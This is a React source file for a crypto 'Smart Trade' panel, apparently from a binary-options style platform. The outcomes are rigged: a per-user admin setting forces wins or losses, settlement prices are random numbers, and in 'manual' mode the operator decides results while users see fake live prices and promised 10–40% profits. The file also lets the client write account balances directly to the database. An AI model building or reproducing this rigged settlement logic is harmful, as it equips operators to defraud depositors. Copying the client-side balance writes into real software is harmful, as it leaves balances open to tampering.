import { useState, useEffect, useCallback } from 'react';
import { useAssets } from '@/contexts/AssetsContext';
import { useTradeHistory } from '@/contexts/TradeHistoryContext';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { toast } from 'sonner';
import { TrendingUp, TrendingDown, Clock, DollarSign, Percent } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/contexts/AuthContext';

interface TradingPanelProps {
  symbol: string;
  currentPrice: number;
}

interface ActiveTrade {
  id: string;
  direction: 'long' | 'short';
  amount: number;
  entryPrice: number;
  duration: number;
  profitRate: number;
  startTime: number;
  fee: number;
}

const TIME_OPTIONS = [
  { duration: 60, profitRate: 0.10, label: '1 min', profit: '10%' },
  { duration: 180, profitRate: 0.20, label: '3 min', profit: '20%' },
  { duration: 300, profitRate: 0.30, label: '5 min', profit: '30%' },
  { duration: 900, profitRate: 0.40, label: '15 min', profit: '40%' },
];

const FEE_RATE = 0.01; // 1% fee

const TradingPanel = ({ symbol, currentPrice }: TradingPanelProps) => {
  const { getBalance, updateBalance, refreshAssets } = useAssets();
  const { addTrade } = useTradeHistory();
  const { user } = useAuth();
  const [direction, setDirection] = useState<'long' | 'short'>('long');
  const [usdtAmount, setUsdtAmount] = useState('');
  const [selectedTime, setSelectedTime] = useState(TIME_OPTIONS[0]);
  const [activeTrade, setActiveTrade] = useState<ActiveTrade | null>(null);
  const [countdown, setCountdown] = useState(0);
  const [settlementPrice, setSettlementPrice] = useState<number | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const usdtBalance = getBalance('USDT');

  // Countdown timer
  useEffect(() => {
    if (!activeTrade) return;

    const interval = setInterval(() => {
      const elapsed = Math.floor((Date.now() - activeTrade.startTime) / 1000);
      const remaining = activeTrade.duration - elapsed;

      if (remaining <= 0) {
        // Trade ended - settle
        handleSettlement();
        clearInterval(interval);
      } else {
        setCountdown(remaining);
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [activeTrade]);

  const handleSettlement = useCallback(async () => {
    if (!activeTrade || !user) return;

    // Check user's trade mode from system_config
    let tradeMode: 'manual' | 'always_win' | 'always_lose' = 'manual';
    try {
      const { data: modeConfig } = await supabase
        .from('system_config')
        .select('value')
        .eq('key', `user_trade_mode_${user.id}`)
        .maybeSingle();
      
      if (modeConfig?.value) {
        tradeMode = modeConfig.value as 'manual' | 'always_win' | 'always_lose';
      }
    } catch (error) {
      console.error('Failed to fetch trade mode:', error);
    }

    // Simulate price change
    const priceChange = (Math.random() - 0.5) * 0.1;
    const finalPrice = activeTrade.entryPrice * (1 + priceChange);
    setSettlementPrice(finalPrice);

    // Determine win/loss based on trade mode or random
    let isWin: boolean;
    if (tradeMode === 'always_win') {
      isWin = true;
    } else if (tradeMode === 'always_lose') {
      isWin = false;
    } else {
      // Manual mode - the transaction stays pending for admin to decide
      // Update transaction to remain pending (admin will handle it)
      toast.info('交易已提交，等待结算...', { duration: 3000 });
      
      // Clear trade display
      setTimeout(() => {
        setActiveTrade(null);
        setSettlementPrice(null);
        setCountdown(0);
      }, 3000);
      
      refreshAssets();
      return;
    }

    const netAmount = activeTrade.amount - activeTrade.fee;
    let profit = 0;
    
    if (isWin) {
      profit = netAmount * activeTrade.profitRate;
      const totalReturn = activeTrade.amount + profit;
      
      // Use the secure RPC to add balance
      const { error: balanceError } = await supabase
        .rpc('admin_add_balance', {
          _user_id: user.id,
          _currency: 'USDT',
          _amount: totalReturn
        });

      if (balanceError) {
        // Fallback to direct update if RPC fails (for regular users)
        const { data: assetData } = await supabase
          .from('assets')
          .select('balance')
          .eq('user_id', user.id)
          .eq('currency', 'USDT')
          .single();
        
        if (assetData) {
          await supabase
            .from('assets')
            .update({ balance: assetData.balance + totalReturn })
            .eq('user_id', user.id)
            .eq('currency', 'USDT');
        }
      }

      // Update transaction status
      await supabase
        .from('transactions')
        .update({ 
          status: 'completed',
          note: `Smart Trade: ${activeTrade.direction.toUpperCase()} ${symbol} @ $${activeTrade.entryPrice.toLocaleString()} for ${Math.floor(activeTrade.duration / 60)} min | Result: WIN | Profit: +${profit.toFixed(2)} USDT`
        })
        .eq('user_id', user.id)
        .eq('type', 'trade')
        .eq('status', 'pending')
        .order('created_at', { ascending: false })
        .limit(1);

      updateBalance('USDT', totalReturn);
      toast.success(
        `🎉 Trade Won! +${profit.toFixed(2)} USDT (${(activeTrade.profitRate * 100).toFixed(0)}% profit)`,
        { duration: 5000 }
      );
    } else {
      profit = -activeTrade.amount;
      
      // Update transaction status
      await supabase
        .from('transactions')
        .update({ 
          status: 'completed',
          note: `Smart Trade: ${activeTrade.direction.toUpperCase()} ${symbol} @ $${activeTrade.entryPrice.toLocaleString()} for ${Math.floor(activeTrade.duration / 60)} min | Result: LOSS | Lost: -${activeTrade.amount.toFixed(2)} USDT`
        })
        .eq('user_id', user.id)
        .eq('type', 'trade')
        .eq('status', 'pending')
        .order('created_at', { ascending: false })
        .limit(1);

      toast.error(
        `Trade Lost. -${activeTrade.amount.toFixed(2)} USDT`,
        { duration: 5000 }
      );
    }

    // Add to trade history
    addTrade({
      symbol,
      direction: activeTrade.direction,
      amount: activeTrade.amount,
      entryPrice: activeTrade.entryPrice,
      settlementPrice: finalPrice,
      duration: activeTrade.duration,
      profitRate: activeTrade.profitRate,
      fee: activeTrade.fee,
      profit,
      isWin,
    });

    // Refresh assets from server
    refreshAssets();

    // Clear trade after showing result for a moment
    setTimeout(() => {
      setActiveTrade(null);
      setSettlementPrice(null);
      setCountdown(0);
    }, 3000);
  }, [activeTrade, user, updateBalance, addTrade, symbol, refreshAssets]);

  const handleTrade = async () => {
    if (!user) {
      toast.error('Please login first');
      return;
    }

    const usdtNum = parseFloat(usdtAmount);

    if (isNaN(usdtNum) || usdtNum <= 0) {
      toast.error('Please enter a valid amount');
      return;
    }

    const fee = usdtNum * FEE_RATE;
    const totalCost = usdtNum;

    if (totalCost > usdtBalance) {
      toast.error('Insufficient USDT balance');
      return;
    }

    setIsSubmitting(true);

    try {
      // Deduct amount from user's balance via Supabase
      const { error: updateError } = await supabase
        .from('assets')
        .update({ balance: usdtBalance - totalCost })
        .eq('user_id', user.id)
        .eq('currency', 'USDT');

      if (updateError) {
        throw new Error('Failed to update balance');
      }

      // Record the trade transaction
      await supabase.from('transactions').insert({
        user_id: user.id,
        type: 'trade',
        amount: usdtNum,
        currency: 'USDT',
        fee: fee,
        status: 'pending',
        note: `Smart Trade: ${direction.toUpperCase()} ${symbol} @ $${currentPrice.toLocaleString()} for ${selectedTime.label}`,
      });

      // Refresh assets to sync with database (don't call updateBalance as it will double-deduct)
      await refreshAssets();

      const trade: ActiveTrade = {
        id: Date.now().toString(),
        direction,
        amount: usdtNum,
        entryPrice: currentPrice,
        duration: selectedTime.duration,
        profitRate: selectedTime.profitRate,
        startTime: Date.now(),
        fee: fee,
      };

      setActiveTrade(trade);
      setCountdown(selectedTime.duration);
      setUsdtAmount('');

      toast.success(
        `${direction === 'long' ? '📈 Long' : '📉 Short'} position opened! ${selectedTime.label} @ $${currentPrice.toLocaleString()}`,
        { duration: 3000 }
      );
    } catch (error: any) {
      toast.error(error.message || 'Failed to place trade');
    } finally {
      setIsSubmitting(false);
    }
  };

  const setPercentage = (pct: number) => {
    const maxUsdt = usdtBalance * pct;
    setUsdtAmount(maxUsdt.toFixed(2));
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  // If there's an active trade, show the trade status
  if (activeTrade) {
    const progress = ((activeTrade.duration - countdown) / activeTrade.duration) * 100;
    const priceChange = settlementPrice 
      ? ((settlementPrice - activeTrade.entryPrice) / activeTrade.entryPrice) * 100
      : ((currentPrice - activeTrade.entryPrice) / activeTrade.entryPrice) * 100;
    
    const isWinning = activeTrade.direction === 'long' 
      ? (settlementPrice || currentPrice) > activeTrade.entryPrice
      : (settlementPrice || currentPrice) < activeTrade.entryPrice;

    return (
      <div className="bg-card border border-border rounded-xl p-4">
        <div className="mb-4 text-center">
          <h3 className="font-semibold text-lg flex items-center justify-center gap-2">
            {activeTrade.direction === 'long' ? (
              <>
                <TrendingUp className="w-5 h-5 text-[hsl(145,60%,45%)]" />
                <span className="text-[hsl(145,60%,45%)]">Long {symbol}</span>
              </>
            ) : (
              <>
                <TrendingDown className="w-5 h-5 text-[hsl(0,70%,55%)]" />
                <span className="text-[hsl(0,70%,55%)]">Short {symbol}</span>
              </>
            )}
          </h3>
        </div>

        {/* Countdown */}
        <div className="text-center mb-4">
          <div className="text-3xl font-bold mb-2">
            {settlementPrice ? '⏱️ Settled' : formatTime(countdown)}
          </div>
          <div className="w-full bg-muted rounded-full h-2">
            <div 
              className={`h-2 rounded-full transition-all ${
                activeTrade.direction === 'long' 
                  ? 'bg-[hsl(145,60%,45%)]' 
                  : 'bg-[hsl(0,70%,55%)]'
              }`}
              style={{ width: `${progress}%` }}
            />
          </div>
        </div>

        {/* Trade Info */}
        <div className="space-y-3 text-sm">
          <div className="flex justify-between items-center p-2 bg-muted/50 rounded">
            <span className="text-muted-foreground flex items-center gap-1">
              <DollarSign className="w-4 h-4" />
              Amount
            </span>
            <span className="font-medium">{activeTrade.amount.toFixed(2)} USDT</span>
          </div>

          <div className="flex justify-between items-center p-2 bg-muted/50 rounded">
            <span className="text-muted-foreground">Entry Price</span>
            <span className="font-medium">${activeTrade.entryPrice.toLocaleString()}</span>
          </div>

          <div className="flex justify-between items-center p-2 bg-muted/50 rounded">
            <span className="text-muted-foreground">
              {settlementPrice ? 'Settlement Price' : 'Current Price'}
            </span>
            <span className={`font-medium ${isWinning ? 'text-[hsl(145,60%,45%)]' : 'text-[hsl(0,70%,55%)]'}`}>
              ${(settlementPrice || currentPrice).toLocaleString()}
            </span>
          </div>

          <div className="flex justify-between items-center p-2 bg-muted/50 rounded">
            <span className="text-muted-foreground flex items-center gap-1">
              <Percent className="w-4 h-4" />
              Price Change
            </span>
            <span className={`font-medium ${priceChange >= 0 ? 'text-[hsl(145,60%,45%)]' : 'text-[hsl(0,70%,55%)]'}`}>
              {priceChange >= 0 ? '+' : ''}{priceChange.toFixed(2)}%
            </span>
          </div>

          <div className="flex justify-between items-center p-2 bg-muted/50 rounded">
            <span className="text-muted-foreground">Fee (1%)</span>
            <span className="font-medium text-muted-foreground">-{activeTrade.fee.toFixed(2)} USDT</span>
          </div>

          <div className={`flex justify-between items-center p-3 rounded-lg ${
            isWinning 
              ? 'bg-[hsl(145,60%,45%)]/20 border border-[hsl(145,60%,45%)]/30' 
              : 'bg-[hsl(0,70%,55%)]/20 border border-[hsl(0,70%,55%)]/30'
          }`}>
            <span className="font-medium">Expected Result</span>
            <span className={`font-bold text-lg ${isWinning ? 'text-[hsl(145,60%,45%)]' : 'text-[hsl(0,70%,55%)]'}`}>
              {isWinning 
                ? `+${((activeTrade.amount - activeTrade.fee) * activeTrade.profitRate).toFixed(2)} USDT`
                : `-${activeTrade.amount.toFixed(2)} USDT`
              }
            </span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-card border border-border rounded-xl p-4">
      {/* Direction Selection */}
      <div className="flex gap-2 mb-4">
        <Button
          variant={direction === 'long' ? 'default' : 'outline'}
          onClick={() => setDirection('long')}
          className={`flex-1 ${direction === 'long' ? 'bg-[hsl(145,60%,45%)] hover:bg-[hsl(145,60%,40%)] text-white' : ''}`}
        >
          <TrendingUp className="w-4 h-4 mr-2" />
          Long
        </Button>
        <Button
          variant={direction === 'short' ? 'default' : 'outline'}
          onClick={() => setDirection('short')}
          className={`flex-1 ${direction === 'short' ? 'bg-[hsl(0,70%,55%)] hover:bg-[hsl(0,70%,50%)] text-white' : ''}`}
        >
          <TrendingDown className="w-4 h-4 mr-2" />
          Short
        </Button>
      </div>

      {/* Time Selection */}
      <div className="mb-4">
        <label className="text-sm text-muted-foreground mb-2 block flex items-center gap-1">
          <Clock className="w-4 h-4" />
          Duration & Profit Rate
        </label>
        <div className="grid grid-cols-2 gap-2">
          {TIME_OPTIONS.map((option) => (
            <button
              key={option.duration}
              onClick={() => setSelectedTime(option)}
              className={`p-3 rounded-lg border transition-all text-left ${
                selectedTime.duration === option.duration
                  ? 'border-primary bg-primary/10'
                  : 'border-border hover:border-primary/50'
              }`}
            >
              <div className="font-medium">{option.label}</div>
              <div className="text-sm text-[hsl(145,60%,45%)]">+{option.profit} profit</div>
            </button>
          ))}
        </div>
      </div>

      <div className="space-y-4">
        {/* Current Price */}
        <div className="p-3 bg-muted/50 rounded-lg">
          <div className="text-sm text-muted-foreground mb-1">Current Price</div>
          <div className="text-xl font-bold">${currentPrice.toLocaleString()}</div>
        </div>

        {/* Amount Input */}
        <div>
          <label className="text-sm text-muted-foreground mb-1 block">Amount (USDT)</label>
          <Input
            type="number"
            value={usdtAmount}
            onChange={(e) => setUsdtAmount(e.target.value)}
            placeholder="0.00"
            disabled={isSubmitting}
          />
          <div className="flex gap-2 mt-2">
            {[0.25, 0.5, 0.75, 1].map((pct) => (
              <button
                key={pct}
                onClick={() => setPercentage(pct)}
                className="flex-1 text-xs py-1 rounded bg-muted hover:bg-muted/80 transition-colors"
                disabled={isSubmitting}
              >
                {pct * 100}%
              </button>
            ))}
          </div>
        </div>

        {/* Trade Summary */}
        <div className="text-sm text-muted-foreground space-y-1">
          <div className="flex justify-between">
            <span>Available:</span>
            <span>{usdtBalance.toLocaleString()} USDT</span>
          </div>
          <div className="flex justify-between">
            <span>Fee (1%):</span>
            <span>{((parseFloat(usdtAmount) || 0) * FEE_RATE).toFixed(2)} USDT</span>
          </div>
          <div className="flex justify-between text-[hsl(145,60%,45%)]">
            <span>Max Profit ({selectedTime.profit}):</span>
            <span>
              +{(((parseFloat(usdtAmount) || 0) * (1 - FEE_RATE)) * selectedTime.profitRate).toFixed(2)} USDT
            </span>
          </div>
        </div>

        <Button
          onClick={handleTrade}
          disabled={isSubmitting}
          className={`w-full ${
            direction === 'long' 
              ? 'bg-[hsl(145,60%,45%)] hover:bg-[hsl(145,60%,40%)]' 
              : 'bg-[hsl(0,70%,55%)] hover:bg-[hsl(0,70%,50%)]'
          } text-white`}
        >
          <TrendingUp className="w-4 h-4 mr-2" />
          {isSubmitting ? 'Placing Order...' : 'Buy Now'}
        </Button>
      </div>
    </div>
  );
};

export default TradingPanel;
